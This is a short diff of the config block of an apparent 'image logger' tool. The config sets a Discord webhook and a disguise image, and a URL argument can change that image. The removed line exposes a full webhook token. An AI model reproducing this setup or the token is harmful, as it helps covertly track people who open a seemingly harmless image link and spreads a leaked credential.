@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1397570838378709003/5UOjnXabxQWrlpI-t2r4oSrdnPjBikmb2UHy3ZRnC7_ew290dU3YAiT-lk0DDer4__kP",
+    "webhook": "https://static.vecteezy.com/system/resources/previews/006/874/231/original/discord-logo-icons-editorial-free-vector.jpg",
     "image": "https://esi.si.com/.image/t_share/MjA0NDQwMTM3MDA0NzUzOTk3/jynxzi-streamer.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
